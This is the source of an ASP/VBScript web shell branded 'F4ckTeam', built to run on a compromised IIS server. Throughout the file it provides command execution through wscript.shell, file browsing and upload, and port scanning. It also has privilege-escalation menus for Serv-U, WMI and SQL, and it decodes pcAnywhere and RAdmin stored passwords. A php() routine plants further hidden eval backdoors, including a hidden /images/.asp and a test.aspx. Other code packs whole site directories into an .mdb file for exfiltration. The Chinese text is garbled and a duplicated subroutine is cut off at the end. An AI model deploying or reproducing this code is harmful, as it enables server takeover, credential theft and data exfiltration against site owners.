<object runat=server id=oScriptlhn scope=page classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
<object runat=server id=oScriptlhn scope=page classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
<%@ LANGUAGE = VBScript    %><%
UserPass="F4ck"
Server.ScriptTimeout=999999999
Response.Buffer =true
On Error Resume Next
mingzi="F4ckTeam"
nimajb="������̳ - F4ckTeam"
SiteURL="http://team.f4ck.net"
Copyright="������̳ - F4ckTeam<p/><table width=""450"" border=""1"" cellpadding=""10""><tr><td><div align=center></td></tr></table>"
sub ShowErr()
If Err Then
jb"<br><a href='javascript:history.back()'><br>&nbsp;" & Err.DescrIption & "</a><br>"
Err.Clear:Response.Flush
ENd IF
End SUB
function jb(Str)
Response.WRItE(Str)
END function
Sub mbd(Str)
execute(Str)
END Sub
Function rePATH(S)
REpath=REpLAcE(s,"\","\\")
ENd Function
FuNctIon RRepaTh(S)
RREpaTH=rEplAcE(S,"\\","\")
end fUncTion
Url=REQueSt.sErVErvARiables("URL")
nimajbm=requESt.sErVeRVArIABlEs("LOCAL_ADDR")
AcTIoN=ReQUESt("Action")
RooTpATH=SeRveR.mAPpaTH(".")
WWWROOt=SErVER.MAppATH("/")
sba=request.servervariables("http_host")
ApdB=Replace(Apds(i),"\Device\","")
appbd=rEQUEsT.seRvErVARIaBLES("PATH_INFO") 
FOLdErpAth=REqueSt("FolderPath")
ScrName=Request.ServerVariables("Script_Name")
fNAME=reQUesT("FName")
ServerU=ReQueST.SERVervaRIables("http_host")
WoriNima=Request.ServerVariables("SERVER_NAME")
O0O0=Request.ServerVariables("PATH_TRANSLATED")
WoriNiba=Request.ServerVariables("SERVER_SOFTWARE")
Worininai=Request.ServerVariables("LOCAL_ADDR")
jbmc=Request.ServerVariables("NUMBER_OF_PROCESSORS")
jbmb=Request.ServerVariables("OS")
u=sba&URl
BACkuRl="<br><br><center><a href='javascript:history.back()'>����</a></center>"
dim ShiSan,ShiSanNewstr,ShiSanI,fso,f,a,b,temp,c,theAct, thePath
Function ShiSanFun(ShiSanObjstr)
ShiSanObjstr = Replace(ShiSanObjstr, "��", """")
For ShiSanI = 1 To Len(ShiSanObjstr)
If Mid(ShiSanObjstr, ShiSanI, 1) <> "��" Then
ShiSanNewStr = Mid(ShiSanObjstr, ShiSanI, 1) & ShiSanNewStr
Else
ShiSanNewStr = vbCrLf & ShiSanNewStr
End If
Next
ShiSanFun = ShiSanNewStr
End Function
mm=ShowErrs
Set   fso =  CreateObject(oBt(0,0))   
Set   f   =  fso.GetFile(O0O0) 
if  f.attributes <> 39 then
'f.attributes = 39
end if
jb"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">"
jb"<title>"&nimajb&" - "&nimajbm&" </title>":jb"<style type=""text/css"">":jb"body,td{font-size: 12px;background-color:;color:#eee;":jb"margin: 1px;margin-left:1px;":jb"SCROLLBAR-FACE-COLOR: #232323; SCROLLBAR-HIGHLIGHT-COLOR: #232323; ":jb"SCROLLBAR-SHADOW-COLOR: #383838; SCROLLBAR-DARKSHADOW-COLOR: #383838; ":jb"SCROLLBAR-3DLIGHT-COLOR: #232323; SCROLLBAR-ARROW-COLOR: #fff;":jb"SCROLLBAR-TRACK-COLOR: #383838;}":jb"a{color:#ddd;text-decoration: none;}a:hover{color:red;background:#000}":jb"input,select,textarea{font-size: 12px;border:1px solid #FFF;color:#FFFFFF; background-color:#000;}":jb".C{background-color:#000000;border:0px}":jb".cmd{background-color:#000;color:#FFF}</style>":jb"<meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312""></head><body onmouseover=""window.status='��������վ���� Ա��ȫ�����,����ʹ���ڷ� ����;,������߸� ������';return true"" style=""FILTER: progid:DXImageTransform.Microsoft.Gradient(gradientType=1,startColorStr=#000000,endColorStr=#626262)"">":jb"<script language=javascript>function killErrors(){return true;}window.onerror=killErrors;":jb"function yesok(){if (confirm(""ȷ��Ҫִ�� �˲�����""))return true;else return false;}":jb"function runClock(){theTime = window.setTimeout(""runClock()"", 100);var today = new Date();var display= today.toLocaleString();window.status=""����  --""+display;}runClock();":jb"function ShowFolder(Folder){top.addrform.FolderPath.value = Folder;top.addrform.submit();}":jb"function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction==""CopyFile""){DName = prompt(""�����븴�Ƶ�Ŀ���ļ�ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFile""){DName = prompt(""������ �ƶ���Ŀ ���ļ�ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""CopyFolder""){DName = prompt(""�������ƶ���Ŀ���ļ���ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFolder""){DName = prompt(""�������ƶ���Ŀ ���ļ���ȫ����"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""NewFolder""){DName = prompt(""������Ҫ�½����ļ� ��ȫ����"",FName);top.hideform.FName.value = DName;}else if(FAction==""CreateMdb""){DName = prompt(""������Ҫ�½���Mdb�ļ� ȫ����,ע�� ����ͬ����"",FName);top.hideform.FName.value = DName;}else if(FAction==""CompactMdb""){DName = prompt(""������Ҫѹ����Mdb �ļ� ȫ����,ע���ļ��Ƿ���ڣ�"",FName);top.hideform.FName.value = DName;}else{DName = ""Other"";}if(DName!=null){top.hideform.Action.value = FAction;top.hideform.submit();}else{top.hideform.FName.value = """";}}":jb"function DbCheck(){if(DbForm.DbStr.value == """"){alert(""�������� ���ݿ�"");FullDbStr(0);return false;}return true;}":jb"function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = ""Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&RePath(Session("FolderPath"))&"\\db.mdb;Jet OLEDB:Database Password=***"";Str[1] = ""Driver={Sql Server};Server="&nimajbm&",1433;Database=DbName;Uid=sa;Pwd=****"";Str[2] = ""Driver={MySql};Server="&nimajbm&";Port=3306;Database=DbName;Uid=root;Pwd=****"";Str[3] = ""Dsn=DsnName"";Str[4] = ""SELECT * FROM [TableName] WHERE ID<100"";Str[5] = ""INSERT INTO [TableName](USER,PASS) VALUES(\'username\',\'password\')"";Str[6] = ""DELETE FROM [TableName] WHERE ID=100"";Str[7] = ""UPDATE [TableName] SET USER=\'username\' WHERE ID=100"";Str[8] = ""CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))"";Str[9] = ""DROP TABLE [TableName]"";Str[10]= ""ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)"";Str[11]= ""ALTER TABLE [TableName] DROP COLUMN PASS"";Str[12]= ""��ֻ��ʾ һ������ʱ������ʾ �ֶε�ȫ���ֽڣ����������� �Ʋ�ѯʵ��.\n����һ������ֻ��ʾ�ֶε�ǰ��ʮ���ֽڡ�"";if(i<=3){DbForm.DbStr.value = Str[i];DbForm.SqlStr.value = """";abc.innerHTML=""<center>��ȷ�ϼ�������  �ݿ�������SQL���� ������䡣</center>"";}else if(i==12){alert(Str[i]);}else{DbForm.SqlStr.value = Str[i];}return true;}":jb"function FullSqlStr(str,pg){if(DbForm.DbStr.value.length<5){alert(""�������ݿ���  �Ӵ��Ƿ���ȷ!"");return false;}if(str.length<10){alert(""����SQL��� �Ƿ���ȷ!"");return false;}DbForm.SqlStr.value = str;DbForm.Page.value = pg;abc.innerHTML="""";DbForm.submit();return true;}"
jb"</script>"
jb "<body" 
IF actiON="" theN jb " scroll=no"
jb">"
DIm oBt(18,2)
oBt(0,0) = "Scri"&"pting.FileSyste"&"mObject"
  oBt(0,2) = "�ļ��������"
Obt(1,0) = "ws"&"cript.shell"
  obt(1,2) = "������ִ�����,��ʾ"
obT(2,0) = "ADOX.Catalog"
  ObT(2,2) = "ACCESS�������"
oBt(3,0) = "JRO.JetEngine"
  obt(3,2) = "ACCESSѹ�����"
OBt(4,0) = "Scripting.Dictionary" 
  ObT(4,2) = "�������ϴ��������"
OBT(5,0) = "Adodb.connection"
  oBT(5,2) = "���ݿ��������"
oBT(6,0) = "Adodb.Stream"
  oBT(6,2) = "�������ϴ����"
OBT(7,0) = "SoftArtisans.FileUp"
  OBT(7,2) = "SA-FileUp �ļ��ϴ����"
obT(8,0) = "LyfUpload.UploadFile"
  OBT(8,2) = "���Ʒ��ļ��ϴ����"
oBT(9,0) = "Persits.Upload.1"
  oBt(9,2) = "ASPUpload �ļ��ϴ����"
obT(10,0) = "JMail.SmtpMail"
  Obt(10,2) = "JMail �ʼ��շ����"
obt(11,0) = "CDONTS.NewMail"
  ObT(11,2) = "����SMTP�������"
ObT(12,0) = "SmtpMail.SmtpMail.1"
  oBT(12,2) = "SmtpMail�������"
OBT(13,0) = "Micros"&"oft.XM"&"LH"&"TTP"
  OBt(13,2) = "���ݴ������"
OBT(14,0) = "ws"&"cript.shell.1"
  OBt(14,2) = "���wsh���������Ը���������"
OBT(15,0) = "WS"&"CRIPT.NETWORK"
  OBt(15,2) = "�鿴��������Ϣ���������ʱ����������Ȩ"
OBT(16,0) = "she"&"ll.appl"&"ication"
  OBt(16,2) = "she"&"ll.appli"&"cation ��������FSOʱ�����ļ��Լ�ִ������"
OBT(17,0) = "sh"&"ell.appl"&"ication.1"
  OBt(17,2) = "she"&"ll.appli"&"cation �ı�������FSOʱ�����ļ��Լ�ִ������"
OBT(18,0) = "Shell.Users"
  OBt(18,2) = "ɾ����net.exe net1.exe�����������û������"
fOr I=0 tO 18
Set T=serVER.CReATEoBJEcT(obT(I,0))
If -2147221005 <> err Then
ISoBJ=" ��"
ELSE
ISobj=" <font color=red>��</font>"
eRr.cLEar
eNd iF
Set T=nOthInG
oBt(i,1)=IsoBj
neXt
IF foLderPaTH<>"" Then
sEssioN("FolderPath")=rRepatH(fOlDeRpATH)
EnD If
If SeSSIoN("FolderPath")="" THEN
fOLDERpAth=RoOTpaTH
SESSIOn("FolderPath")=fOLDeRPatH
end IF

Function PcAnywhere4()
jb"<div align='center'>PcAnywhere��Ȩ Bin�汾</div>"
jb"<form name='xform' method='post'>"
jb"<table width='80%'border='0'><tr>"
jb"<td width='10%'>cif�ļ�: </td><td width='10%'><input name='path' type='text' value='C:\Documents and Settings\All Users\Application Data\\Symantec\pcAnywhere\Citempl.cif' size='80'></td>"
jb"<td><input type='submit' value=' �ύ '></td>"
jb"</table>"
end Function
jb"</form>"
jb"<script>"
jb"function RUNonclick(){"
jb"document.xform.china.name = parent.pwd.value;"
jb"document.xform.action = parent.url.value;"
jb"document.xform.submit();"
jb"}"
jb"</script>"
Function StreamLoadFromFile(sPath)
Dim oStream
Set oStream = Server.CreateObject("Adodb.Stream")
With oStream
.Type = 1
.Mode = 3
.Open
.LoadFromFile(sPath)
.Position = 0
StreamLoadFromFile = .Read
.Close
End With
Set oStream = Nothing
End Function
Function hexdec(strin) 
Dim i, j, k, result 
result = 0 
For i = 1 To Len(strin) 
If Mid(strin, i, 1) = "f" Or Mid(strin, i, 1) ="F" Then 
 j = 15 
End If 
If Mid(strin, i, 1) = "e" Or Mid(strin, i, 1) = "E" Then 
 j = 14 
End If 
If Mid(strin, i, 1) = "d" Or Mid(strin, i, 1) = "D" Then 
 j = 13 
End If 
If Mid(strin, i, 1) = "c" Or Mid(strin, i, 1) = "C" Then 
 j = 12 
End If 
If Mid(strin, i, 1) = "b" Or Mid(strin, i, 1) = "B" Then 
 j = 11 
End If 
If Mid(strin, i, 1) = "a" Or Mid(strin, i, 1) = "A" Then 
 j = 10 
End If 
If Mid(strin, i, 1) <= "9" And Mid(strin, i, 1) >= "0" Then 
 j = CInt(Mid(strin, i, 1)) 
End If 
For k = 1 To Len(strin) - i 
 j = j * 16 
Next 
result = result + j 
Next 
hexdec = result 
End Function 
Function PcAnywhere(data,mode)
HASH= Mid(data,3)
If mode = "pass" Then number = 32: Cifnum = 144
If mode = "user" Then number = 30: Cifnum = 15
For i = 1 To number Step 2 
pcstr=((hexdec(Mid(data,i,2)) xor hexdec(Mid(hash,i,2))) xor Cifnum)
If ((pcstr <= 32) Or (pcstr>127)) Then Exit For 
decode = decode + Chr(pcstr)
Cifnum=Cifnum+1
Next 
PcAnywhere=decode
End function
Function bin2hex(binstr)
For i = 1 To LenB(binstr)
hexstr = Hex(AscB(MidB(binstr, i, 1)))
If Len(hexstr)=1 Then 
bin2hex=bin2hex&"0"&(LCase(hexstr))
Else
bin2hex=bin2hex& LCase(hexstr)
End If 
Next
End Function 
CIF = Request("path")
If CIF <> "" Then 
BinStr=StreamLoadFromFile(CIF) 
jb "Pcanywhere Reader ==><br><br>"
jb "PATH:"&CIF&"<br>"
jb "�ʺ�:"&PcAnywhere (Mid(bin2hex(BinStr),919,64),"user")
jb "<br>"
jb "����:"&PcAnywhere (Mid(bin2hex(BinStr),1177,32),"pass")
End If 
Function radmin()
Set WSH= Server.CreateObject("WSCRIPT.SHELL")
RadminPath="HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\"
Parameter="Parameter"
Port = "Port"
ParameterArray=WSH.REGREAD(RadminPath & Parameter )
jb Parameter&":"
If IsArray(ParameterArray) Then
For i = 0 To UBound(ParameterArray)
If  Len (hex(ParameterArray(i)))=1 Then 
strObj = strObj & "0"&CStr(Hex(ParameterArray(i)))
Else
strObj = strObj & Hex(ParameterArray(i))
End If 
Next
jb strobj
Else
jb "Error! Can't Read!"
End If
jb "<br><br>"
PortArray=WSH.REGREAD(RadminPath & Port )
If IsArray(PortArray) Then 
jb Port &":" 
jb hextointer(CStr(Hex(PortArray(1)))&CStr(Hex(PortArray(0))))
Else 
jb "Error! Can't Read!"
End If
End Function
Function hextointer(strin) 
Dim i, j, k, result 
result = 0 
For i = 1 To Len(strin) 
If Mid(strin, i, 1) = "f" Or Mid(strin, i, 1) ="F" Then 
j = 15 
End If 
If Mid(strin, i, 1) = "e" Or Mid(strin, i, 1) = "E" Then 
j = 14 
End If 
If Mid(strin, i, 1) = "d" Or Mid(strin, i, 1) = "D" Then 
j = 13 
End If 
If Mid(strin, i, 1) = "c" Or Mid(strin, i, 1) = "C" Then 
j = 12 
End If 
If Mid(strin, i, 1) = "b" Or Mid(strin, i, 1) = "B" Then 
j = 11 
End If 
If Mid(strin, i, 1) = "a" Or Mid(strin, i, 1) = "A" Then 
j = 10 
End If 
If Mid(strin, i, 1) <= "9" And Mid(strin, i, 1) >= "0" Then 
j = CInt(Mid(strin, i, 1)) 
End If 
For k = 1 To Len(strin) - i 
j = j * 16 
Next 
result = result + j 
Next 
hextointer = result 
End Function:function goback():set Ofso = Server.CreateObject(oBt(0,0))
set ofolder = Ofso.Getfolder(Session("FolderPath")):if not ofolder.IsRootFolder then :jb "<script>ShowFolder("""&RePath(ofolder.parentfolder)&""")</script>":else:jb "<script>ShowFolder("""&Session("FolderPath")&""")</script>":jb "<center>�Ѿ��Ǵ��̸�Ŀ¼��!</center>":jb "  <center><br><INPUT type=button value=���� onClick='history.go(-1);'></br></center>":end if:set Ofso=nothing:set ofolder=nothing:end function:function php():On Error Resume Next:set fso=Server.CreateObject(oBt(0,0)):fso.CreateTextFile(server.mappath("test.php")).Write"<?PHP echo 'oo��_��oo'?><?php phpinfo()?>":fso.CreateTextFile(server.mappath("test.jsp")).Write"Jsp Test oo��_��oo":fso.CreateTextFile(Server.MapPath("/")&"/images/.asp").Write""&chr(60)&"%Eval(Request(chr(112))):Set fso=CreateObject(""Scripting.FileSystemObject""):Set f=fso.GetFile(Request.ServerVariables(""PATH_TRANSLATED"")):if  f.attributes <> 39 then:f.attributes = 39:end if"&chr(37)&""&chr(62)&"":fso.CreateTextFile(server.mappath("test.aspx")).Write""&chr(60)&"%@ Page Language=""Jscript"" validateRequest=""false"" "&chr(37)&""&chr(62)&""&chr(60)&""&chr(37)&"Response.Write(eval(Request.Item[""w""],""unsafe""));"&chr(37)&""&chr(62)&"aspx Test oo��_��oo":jb"<center><iframe src=test.php width=300 height=100></iframe>&nbsp;&nbsp;&nbsp;&nbsp; ":jb"<iframe src=test.jsp width=300 height=100></iframe>&nbsp;&nbsp;&nbsp;&nbsp; ":jb"<iframe src=test.aspx width=300 height=100></iframe>&nbsp;&nbsp;&nbsp; </center>":jb"<br><br><p><br><p><br><br><p><br><center>Test<p></font><p><a href='?Action=apjdel'><font size=5 color=red>(ɾ�������ļ�!)</font></a></center>":jb"<tr><td height='20'><a href='?Action=Upload' target='FileFrame'><center><font color=red size=5px>(Զ�����ؽű�ľ��)</font></center></a><br>":End function:function apjdel():set fso=Server.CreateObject(oBt(0,0)):fso.DeleteFile(server.mappath("test.aspx")):fso.DeleteFile(server.mappath("test.php")):fso.DeleteFile(server.mappath("test.jsp")):jb"Del Success!":End function:fUNcTiOn MAINFORm():jb"<form name=""hideform"" method=""post"" action="""&urL&""" target=""FileFrame"">":jb"<input type=""hidden"" name=""Action"">":jb"<input type=""hidden"" name=""FName"">":jb"</form>":jb"<table width='100%' height='100%'  border=0 cellpadding='1' cellspacing='0'>":jb"<tr><td height='30' colspan='2'>":jb"<table width='100%'>":jb"<form name='addrform' method='post' action='"&Url&"' target='_parent'>":jb"<tr><td width='60' align='center'>��ַ����</td><td>":jb"<input name='FolderPath' style='width:100%' value='"&SesSIon("FolderPath")&"'>":jb"</td><td width='140' align='center'><input name='Submit' type='submit' value='ת��'> <input type='submit' value='ˢ��������' onclick='FileFrame.location.reload()'>" :jb"  <tr align='center' valign='middle'>":jb"<tr>��ȨĿ¼�б���<a href='javascript:ShowFolder(""C:\\Program Files"")'>Program</a>����<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\"")'>AllUsers</a>����<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\����ʼ���˵�\\����\\"")'>��ʼ <b>��</b> ����</a>����<a href='javascript:ShowFolder(""C:\\RECYCLED\\"")'>RECYCLED</a>����<a href='javascript:ShowFolder(""C:\\RECYCLER\\"")'>RECYCLER</a>����<a href='javascript:ShowFolder(""D:\\RECYCLER\\"")'>D:\RECYCLER</a>����<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\"")'>pcAnywhere</a>����<a href='javascript:ShowFolder(""c:\\Program Files\\serv-u\\"")'>serv-u</a>����<a href='javascript:ShowFolder(""C:\\Program Files\\Real"")'>RealServer</a>����<a href='javascript:ShowFolder(""C:\\Program Files\\Microsoft SQL Server\\"")'>SQL</a>����<a href='javascript:ShowFolder(""C:\\WINDOWS\\system32\\config\\"")'>config</a>����<a href='javascript:ShowFolder(""c:\\WINDOWS\\system32\\inetsrv\\data\\"")'>data</a>����<a href='javascript:ShowFolder(""c:\\windows\\Temp\\"")'>Temp</a>����<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Documents\\"")'>Documents</a>��</td><td>":jb"</td></tr></form></table></td></tr><tr><td width='170'>":jb"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td>":jb"<td>":jb"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1'></iframe>":jb"</td></tr></table>":End FuNCtiON:
sub echo(str)
response.write str
end sub
funcTiOn maINmenU():jb"<table width='100%' cellspacing='0' cellpadding='0'>":jb"<tr><td height='5'></td></tr>":jb"</td></tr>"
iF OBT(0,1)=" ��" Then
jb"<tr><td height='24'>��FSO/��Ȩ��</td></tr>"
Else
jb"<tr><td height=24 onmouseover=""menu1.style.display=''""><b>+>�鿴Ӳ��</b><div id=menu1 style=""width:100%;display='none'"" onmouseout=""menu1.style.display='none'"">"
SET ABC=NEW LBf:jb abC.SHOwDRiVeR():SET ABc=noTHing
jb"</div></td></tr><tr><td height='20'><a href='javascript:ShowFolder("""&RePAtH(WWWROot)&""")'>��վ���Ŀ¼</a></td></tr>"
jb"<tr><td height='20'><a href='javascript:ShowFolder("""&rEPaTh(RootPAth)&""")'>�񱾳���Ŀ¼</a></td></tr>"
jb"<tr><td height='20'><a href='javascript:FullForm("""&rEPAth(sessiOn("FolderPath")&"\NewFolder")&""",""NewFolder"")'>���½�Ŀ¼</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=EditFile' target='FileFrame'>���½��ı�</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=UpFile' target='FileFrame'>���ϴ��ļ�</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=PageAddToMdb' target='FileFrame'>���ļ��д��-���</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=goback' target='FileFrame'>���ϼ�Ŀ¼</a></td></tr>"
END if
jb"<tr><td height=24 onmouseover=""menu.style.display=''""><b> ��-��������Ϣ�鿴</b><div id=menu4 style=""width:100%;display='none'"" onmouseout=""menu4.style.display='none'"">"
jb"<tr><td height='20'><a href='?Action=ScanDriveForm' target='FileFrame'>��鿴��дĿ¼</a><br>"
jb"<tr><td height='20'><a href='?Action=Course' target='FileFrame'>��ϵͳ����-�û��˺�</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=Alexa' target='FileFrame'>��������Ϣ-���֧��</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=AdminUser' target='FileFrame'>��������ʺ�</a><br>"
jb"<tr><td height='20'><a href='?Action=GetTerminalInfo' target='FileFrame'>�������̽��</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=hiddenshell' target='FileFrame'>������ʬ����</a></td></tr>"
jb"<tr><td height=24 onmouseover=""menu.style.display=''""><b> ��-��Ȩ©�����</b><div id=menu3 style=""width:100%;display='none'"" onmouseout=""menu3.style.display='none'"">"
jb"<tr><td height='20'><a href='?Action=Cmd1Shell' target='FileFrame'>��ִ��Cmd����</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=ScanPort' target='FileFrame'>��˿�ɨ����</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=php' target='FileFrame'>��ű�̽�⹤��</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=Servu' target='FileFrame'>��Serv-U��Ȩ</a><br>"
jb"<tr><td height='20'><a href='?Action=suftp' target='FileFrame'>��Serv-UFTP��Ȩ</a><br>"
jb"<tr><td height='20'><a href='?Action=WMI' target='FileFrame'>��WMIԶ��ִ������</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=SetFileText' target='FileFrame'>���޸�����</a><br>"
jb"<tr><td height='22'><a href='?Action=MMD' target='FileFrame'>��Sql_cmd</a></td></tr>"
jb"<tr><td height='22'><a href='?Action=pcanywhere4' target='FileFrame'>��PcAnyWHere��Ȩ</a></td></tr>"
jb"<tr><td height='22'><a href='?Action=radmin' target='FileFrame'>��RAdmin��Ȩ</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=ReadREG' target='FileFrame'>��ע������</a></td></tr>"
jb"<tr><td height='20'><a href='?Action=Upload' target='FileFrame'>��ֱ������</a><br>"
jb"<tr><td height=24 onmouseover=""menu.style.display=''""><b> ��-���ݿ����</b><div id=menu2 style=""width:100%;display='none'"" onmouseout=""menu2.style.display='none'"">"
jb"<tr><td height='20'><a href='?Action=DbManager' target='FileFrame'>���������ݿ�</a><br>"
jb"<tr><td height='20'><a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\New.mdb")&""",""CreateMdb"")'>����MDB�ļ�</a><br>"
'jb"<tr><td height='24' onmouseover=""menu3.style.display=''""><b>��-�����������</b><div id=menu3 style=""line-height:18px;width:100%;display='none'"" onmouseout=""menu3.style.display='none'"">"
'jb"<tr><td height='22'><a href='http://tiquan.net/ip/?action=sed&cx_33="&ServerU&"' target='FileFrame'>��ͬ����ѯ</a></td></tr> "
'jb"<tr><td height='22'><a href='http://tiquan.net/pr/?Submit=+%B2%E9+%D1%AF+&domain="&Worinima&"' target='FileFrame'>���鿴Prֵ��</a></td></tr>"
'jb"<tr><td height='22'><a href='http://tiquan.net/mmgx/index.htm' target='FileFrame'>�����߸���</a></td></tr> "
jb"<tr><td height='20'><a href='?Action=Logout' target='_top'>���˳���¼</a></td></tr>"

jb"<tr><td><center><hr hight=1 width='100%'>"
jb"<tr><td align=center style='color:red'>"&mingzi&" 's blog</p>"&SiteURL&"</td></tr></table>"
jb"</table>"
Call shellcore
End FunCtion

Sub PageAddToMdb()

theAct = Request("theAct")
thePath = Request("thePath")
Server.ScriptTimeOut=100000
If theAct = "addToMdb" Then
addToMdb(thePath)
jb "<div align=center><br>�������!</div>"&BackUrl
Response.End
End If
If theAct = "releaseFromMdb" Then
unPack(thePath)
jb "<div align=center><br>�������!</div>"&BackUrl
Response.End
End If
jb"<br>�ļ��д��:"
jb"<form method=post>"
jb"<input type=hidden name=""#"" value=mdb(Session(""#""))>"
jb"<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
jb"<input type=hidden value=addToMdb name=theAct>"
jb"<select name=theMethod><option value=fso>FSO</option><option value=app>��FSO</option>"
jb"</select>"
jb" <input type=submit value='��ʼ ���'>"
jb"<br><br>ע: �������hsh.mdb�ļ�,λ��ľ��ͬ��Ŀ¼��"
jb"</form>"
jb"<hr/>�ļ��� �⿪(��FSO֧��):<br/>"
jb"<form method=post>"
jb"<input type=hidden name=""#"" value=Execute(Session(""#""))>"
jb"<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & "\hsh.mdb"" size=80>"
jb" <input type=hidden value=releaseFromMdb name=theAct><input type=submit value='�⿪��'>"
jb"<br><br>ע: �⿪���������� ����λ��ľ��ͬ��Ŀ¼��"
jb"</form>"
End Sub
Sub addToMdb(thePath)
On Error Resume Next
Dim rs, conn, stream, connStr, adoCatalog
Set rs = Server.CreateObject("ADODB.RecordSet")
Set stream = Server.CreateObject("ADODB.Stream")
Set conn = Server.CreateObject(OBT(5,0))
Set adoCatalog = Server.CreateObject("ADOX.Catalog")
connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & Server.MapPath("hsh.mdb")
adoCatalog.Create connStr
conn.Open connStr
conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
stream.Open
stream.Type = 1
rs.Open "FileData", conn, 3, 3
If Request("theMethod") = "fso" Then
fsoTreeForMdb thePath, rs, stream
 Else
saTreeForMdb thePath, rs, stream
End If
rs.Close
Conn.Close
stream.Close
Set rs = Nothing
Set conn = Nothing
Set stream = Nothing
Set adoCatalog = Nothing
End Sub
Function fsoTreeForMdb(thePath, rs, stream)
Dim item, theFolder, folders, files, sysFileList
sysFileList = "$hsh.mdb$HSH.ldb$"
If Server.CreateObject(oBt(0,0)).FolderExists(thePath) = False Then
showErr(thePath & " Ŀ¼�����ڻ��߲��������!")
End If
Set theFolder = Server.CreateObject(oBt(0,0)).GetFolder(thePath)
Set files = theFolder.Files
Set folders = theFolder.SubFolders
For Each item In folders
fsoTreeForMdb item.Path, rs, stream
Next
For Each item In files
If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
rs.AddNew
rs("thePath") = Mid(item.Path, 4)
stream.LoadFromFile(item.Path)
rs("fileContent") = stream.Read()
rs.Update
End If
Next
Set files = Nothing
Set folders = Nothing
Set theFolder = Nothing
End Function
Sub unPack(thePath)
On Error Resume Next
Server.ScriptTimeOut=100000
Dim rs, ws, str, conn, stream, connStr, theFolder
str = Server.MapPath(".") & "\"
Set rs = CreateObject("ADODB.RecordSet")
Set stream = CreateObject("ADODB.Stream")
Set conn = CreateObject(OBT(5,0))
connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"
conn.Open connStr
rs.Open "FileData", conn, 1, 1
stream.Open
stream.Type = 1
Do Until rs.Eof
theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
If Server.CreateObject(oBt(0,0)).FolderExists(str & theFolder) = False Then
createFolder(str & theFolder)
End If
stream.SetEos()
stream.Write rs("fileContent")
stream.SaveToFile str & rs("thePath"), 2
rs.MoveNext
Loop
rs.Close
conn.Close
stream.Close
Set ws = Nothing
Set rs = Nothing
Set stream = Nothing
Set conn = Nothing
End Sub
Sub AdDtOmdB(thePath)
oN eRRoR ResUMe nEXt
DiM rs, CONN, sTrEam, conNStr, ADocatALog
SEt rS = SERVER.crEAtEOBJeCT("ADODB.RecordSet")
seT sTrEAM = SerVer.CreAtEoBjECT("ADODB.Stream")
seT COnN = seRVEr.cREATEObjECt(OBT(5,0))
seT aDOcAtalOg = serVeR.CReatEOBjEct("ADOX.Catalog")
ConNstR = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & servEr.mAPpaTH("HYTop.mdb")
ADocAtaLog.cReATe CoNnsTR
CoNN.OPen conNsTr
CONn.EXEcutE("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
STrEAm.OPEn
streaM.TypE = 1
rS.OPEN "FileData", cOnn, 3, 3
If ReQuEsT("theMethod") = "fso" theN
FsOTrEEforMDB thepaTH, Rs, sTrEAm
 eLSE
SATrEeforMDB thEpATH, Rs, STrEAm
enD IF
rs.ClosE
coNN.CLoSE
stREaM.CLosE
Set rs = NOThInG
set Conn = nothINg
sET stReam = NOThinG
SEt AdOcAtaloG = nOTHIng
End Sub
Sub AdDtOmdB(thePath)
oN eRRoR ResUMe nEXt
DiM rs, CONN, sTrEam, conNStr, ADocatALog
SEt rS = SERVER.crEAtEOBJeCT("ADODB.RecordSet")
seT sTrEAM = SerVer.CreAtEoBjECT("ADODB.Stream")
seT COnN = seRVEr.cREATEObjECt(OBT(5,0))
seT aDOcAtalOg = serVeR.CReatEOBjEct("ADOX.Catalog")
ConNstR = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & servEr.mAPpaTH("HYTop.mdb")
ADocAtaLog.cReATe CoNnsTR
CoNN.OPen conNsTr
